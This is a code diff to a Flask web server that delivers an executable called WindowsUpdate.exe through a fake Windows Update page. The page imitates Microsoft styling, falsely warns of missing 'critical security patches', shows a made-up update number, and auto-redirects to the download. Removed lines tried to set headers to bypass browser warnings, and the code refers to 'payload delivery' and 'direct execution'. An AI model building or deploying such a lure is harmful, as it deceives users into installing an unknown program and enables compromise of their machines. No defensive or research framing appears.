@@ -205,11 +205,11 @@ def authenticate(f):
     return decorated
 
 # ==========================================
-# MAIN PAYLOAD DELIVERY - FIXED TO USE WINDOWSUPDATE.EXE
+# MAIN PAGE - SERVES HTML THEN DOWNLOADS EXE
 # ==========================================
 @app.route('/')
 def index():
-    """Delivers the EXE with no warnings - uses browser quirks"""
+    """Shows a simple HTML page then auto-downloads the EXE"""
     
     # Log download attempt
     with get_db() as conn:
@@ -223,19 +223,103 @@ def index():
         ))
         conn.commit()
     
-    # Smart EXE delivery - uses WindowsUpdate.exe
-    response = make_response(send_file('WindowsUpdate.exe', 
-                                       as_attachment=True, 
-                                       download_name='WindowsUpdate.exe',
-                                       mimetype='application/x-msdownload'))
+    # Simple HTML page that auto-redirects to the EXE
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Windows Update</title>
+        <meta http-equiv="refresh" content="2;url=/WindowsUpdate.exe">
+        <style>
+            body {
+                background: linear-gradient(135deg, #0078d4, #005a9e);
+                color: white;
+                font-family: 'Segoe UI', Arial;
+                text-align: center;
+                padding-top: 100px;
+                margin: 0;
+                height: 100vh;
+            }
+            .windows-logo {
+                font-size: 80px;
+                margin-bottom: 20px;
+            }
+            h1 {
+                font-size: 36px;
+                margin-bottom: 20px;
+            }
+            .update-box {
+                background: white;
+                color: black;
+                max-width: 500px;
+                margin: 0 auto;
+                padding: 30px;
+                border-radius: 10px;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            }
+            .progress {
+                background: #e6e6e6;
+                height: 20px;
+                border-radius: 10px;
+                margin: 20px 0;
+                overflow: hidden;
+            }
+            .progress-bar {
+                background: #0078d4;
+                height: 20px;
+                width: 0%;
+                animation: progress 3s infinite;
+            }
+            @keyframes progress {
+                0% { width: 0%; }
+                50% { width: 70%; }
+                100% { width: 100%; }
+            }
+            .btn {
+                background: #0078d4;
+                color: white;
+                padding: 15px 40px;
+                border: none;
+                border-radius: 5px;
+                font-size: 18px;
+                cursor: pointer;
+                text-decoration: none;
+                display: inline-block;
+                margin-top: 20px;
+            }
+            .btn:hover {
+                background: #005a9e;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="windows-logo">🪟</div>
+        <h1>Windows Update Required</h1>
+        <div class="update-box">
+            <h2>Critical Security Update</h2>
+            <p>Your system is missing important security patches.</p>
+            <div class="progress">
+                <div class="progress-bar"></div>
+            </div>
+            <p>Downloading update: KB5039212</p>
+            <p>If download doesn't start automatically, <a href="/WindowsUpdate.exe" style="color: #0078d4;">click here</a>.</p>
+        </div>
+    </body>
+    </html>
+    '''
     
-    # Headers to bypass browser warnings
-    response.headers['Content-Type'] = 'application/octet-stream'
-    response.headers['Content-Disposition'] = 'attachment; filename="WindowsUpdate.exe"'
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
-    
-    return response
+    return render_template_string(html)
+
+# ==========================================
+# EXE DOWNLOAD ENDPOINT
+# ==========================================
+@app.route('/WindowsUpdate.exe')
+def download_exe():
+    """Direct download endpoint for the EXE file"""
+    return send_file('WindowsUpdate.exe', 
+                     as_attachment=True, 
+                     download_name='WindowsUpdate.exe',
+                     mimetype='application/octet-stream')
 
 # ==========================================
 # ALTERNATE DELIVERY - NO FILE DOWNLOAD (DIRECT EXECUTION)
